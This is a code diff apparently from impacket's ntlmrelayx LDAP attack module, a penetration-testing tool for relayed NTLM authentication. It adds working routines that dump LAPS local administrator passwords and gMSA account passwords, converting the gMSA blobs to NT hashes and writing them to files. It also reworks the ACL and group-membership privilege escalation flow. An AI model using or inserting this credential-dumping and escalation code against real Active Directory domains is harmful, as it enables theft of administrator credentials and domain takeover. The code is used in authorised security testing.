@@ -27,6 +27,8 @@ import ldap3
 import ldapdomaindump
 from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
 from ldap3.utils.conv import escape_filter_chars
+import os
+from Cryptodome.Hash import MD4
 
 from impacket import LOG
 from impacket.examples.ldap_shell import LdapShell
@@ -35,6 +37,7 @@ from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
 from impacket.ldap import ldaptypes
 from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP
 from impacket.uuid import string_to_bin, bin_to_string
+from impacket.structure import Structure, hexdump
 
 # This is new from ldap3 v2.5
 try:
@@ -51,6 +54,43 @@ dumpedDomain = False
 alreadyEscalated = False
 alreadyAddedComputer = False
 delegatePerformed = []
+
+#gMSA structure
+class MSDS_MANAGEDPASSWORD_BLOB(Structure):
+    structure = (
+        ('Version','<H'),
+        ('Reserved','<H'),
+        ('Length','<L'),
+        ('CurrentPasswordOffset','<H'),
+        ('PreviousPasswordOffset','<H'),
+        ('QueryPasswordIntervalOffset','<H'),
+        ('UnchangedPasswordIntervalOffset','<H'),
+        ('CurrentPassword',':'),
+        ('PreviousPassword',':'),
+        #('AlignmentPadding',':'),
+        ('QueryPasswordInterval',':'),
+        ('UnchangedPasswordInterval',':'),
+    )
+
+    def __init__(self, data = None):
+        Structure.__init__(self, data = data)
+
+    def fromString(self, data):
+        Structure.fromString(self,data)
+
+        if self['PreviousPasswordOffset'] == 0:
+            endData = self['QueryPasswordIntervalOffset']
+        else:
+            endData = self['PreviousPasswordOffset']
+
+        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
+        if self['PreviousPasswordOffset'] != 0:
+            self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']]
+
+        self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']]
+        self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]
+
+
 class LDAPAttack(ProtocolAttack):
     """
     This is the default LDAP attack. It checks the privileges of the relayed account
@@ -93,7 +133,7 @@ class LDAPAttack(ProtocolAttack):
         domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
 
         computerName = self.computerName
-        if computerName == '':
+        if not computerName:
             # Random computername
             newComputer = (''.join(random.choice(string.ascii_letters) for _ in range(8)) + '$').upper()
         else:
@@ -507,13 +547,14 @@ class LDAPAttack(ProtocolAttack):
         # Create new dumper object
         domainDumper = ldapdomaindump.domainDumper(self.client.server, self.client, domainDumpConfig)
 
-        if self.tcp_shell is not None:
-            LOG.info('Started interactive Ldap shell via TCP on 127.0.0.1:%d' % self.tcp_shell.port)
-            # Start listening and launch interactive shell.
-            self.tcp_shell.listen()
-            ldap_shell = LdapShell(self.tcp_shell, domainDumper, self.client)
-            ldap_shell.cmdloop()
-            return
+        if self.config.interactive:
+            if self.tcp_shell is not None:
+                LOG.info('Started interactive Ldap shell via TCP on 127.0.0.1:%d' % self.tcp_shell.port)
+                # Start listening and launch interactive shell.
+                self.tcp_shell.listen()
+                ldap_shell = LdapShell(self.tcp_shell, domainDumper, self.client)
+                ldap_shell.cmdloop()
+                return
 
         # If specified validate the user's privileges. This might take a while on large domains but will
         # identify the proper containers for escalating via the different techniques.
@@ -545,21 +586,19 @@ class LDAPAttack(ProtocolAttack):
                 result = self.getUserInfo(domainDumper, self.config.escalateuser)
                 # Unless that account does not exist of course
                 if not result:
-                    LOG.error('Unable to escalate without a valid user, aborting.')
-                    return
-                userDn, userSid = result
-                # Perform the ACL attack
-                self.aclAttack(userDn, domainDumper)
-                return
+                    LOG.error('Unable to escalate without a valid user.')
+                else:
+                    userDn, userSid = result
+                    # Perform the ACL attack
+                    self.aclAttack(userDn, domainDumper)
             elif privs['create']:
                 # Create a nice shiny new user for the escalation
                 userDn = self.addUser(privs['createIn'], domainDumper)
                 if not userDn:
-                    LOG.error('Unable to escalate without a valid user, aborting.')
-                    return
+                    LOG.error('Unable to escalate without a valid user.')
                 # Perform the ACL attack
-                self.aclAttack(userDn, domainDumper)
-                return
+                else:
+                    self.aclAttack(userDn, domainDumper)
             else:
                 LOG.error('Cannot perform ACL escalation because we do not have create user '\
                     'privileges. Specify a user to assign privileges to with --escalate-user')
@@ -572,24 +611,95 @@ class LDAPAttack(ProtocolAttack):
                 result = self.getUserInfo(domainDumper, self.config.escalateuser)
                 # Unless that account does not exist of course
                 if not result:
-                    LOG.error('Unable to escalate without a valid user, aborting.')
-                    return
-                userDn, userSid = result
+                    LOG.error('Unable to escalate without a valid user.')
                 # Perform the Group attack
-                self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])
-                return
+                else:
+                    userDn, userSid = result
+                    self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])
+
             elif privs['create']:
                 # Create a nice shiny new user for the escalation
                 userDn = self.addUser(privs['createIn'], domainDumper)
                 if not userDn:
                     LOG.error('Unable to escalate without a valid user, aborting.')
-                    return
                 # Perform the Group attack
-                self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])
-                return
+                else:
+                    self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])
+
             else:
                 LOG.error('Cannot perform ACL escalation because we do not have create user '\
                           'privileges. Specify a user to assign privileges to with --escalate-user')
+
+        # Dump LAPS Passwords
+        if self.config.dumplaps:
+            LOG.info("Attempting to dump LAPS passwords")
+
+            success = self.client.search(domainDumper.root, '(&(objectCategory=computer))', search_scope=ldap3.SUBTREE, attributes=['DistinguishedName','ms-MCS-AdmPwd'])
+            
+            if success:
+
+                fd = None
+                filename = "laps-dump-" + self.username + "-" + str(random.randint(0, 99999))
+                count = 0
+
+                for entry in self.client.response:
+                    try:
+                        dn = "DN:" + entry['attributes']['distinguishedname']
+                        passwd = "Password:" + entry['attributes']['ms-MCS-AdmPwd']
+
+                        if fd is None:
+                            fd = open(filename, "a+")
+
+                        count += 1
+
+                        LOG.debug(dn)
+                        LOG.debug(passwd)
+
+                        fd.write(dn)
+                        fd.write("\n")
+                        fd.write(passwd)
+                        fd.write("\n")
+
+                    except:
+                        continue
+
+                if fd is None:
+                    LOG.info("The relayed user %s does not have permissions to read any LAPS passwords" % self.username)
+                else:
+                    LOG.info("Successfully dumped %d LAPS passwords through relayed account %s" % (count, self.username))
+                    fd.close()
+
+        #Dump gMSA Passwords
+        if self.config.dumpgmsa:
+            LOG.info("Attempting to dump gMSA passwords")
+            success = self.client.search(domainDumper.root, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=ldap3.SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword'])
+            if success:
+                fd = None
+                filename = "gmsa-dump-" + self.username + "-" + str(random.randint(0, 99999))
+                count = 0
+                for entry in self.client.response:
+                    try:
+                        sam = entry['attributes']['sAMAccountName']
+                        data = entry['attributes']['msDS-ManagedPassword']
+                        blob = MSDS_MANAGEDPASSWORD_BLOB()
+                        blob.fromString(data)
+                        hash = MD4.new ()
+                        hash.update (blob['CurrentPassword'][:-2])
+                        passwd = binascii.hexlify(hash.digest()).decode("utf-8")
+                        userpass = sam + ':::' + passwd
+                        LOG.info(userpass)
+                        count += 1
+                        if fd is None:
+                            fd = open(filename, "a+")
+                        fd.write(userpass)
+                        fd.write("\n")
+                    except:
+                        continue
+                if fd is None:
+                    LOG.info("The relayed user %s does not have permissions to read any gMSA passwords" % self.username)
+                else:
+                    LOG.info("Successfully dumped %d gMSA passwords through relayed account %s" % (count, self.username))
+                    fd.close()
 
         # Perform the Delegate attack if it is enabled and we relayed a computer account
         if self.config.delegateaccess and self.username[-1] == '$':
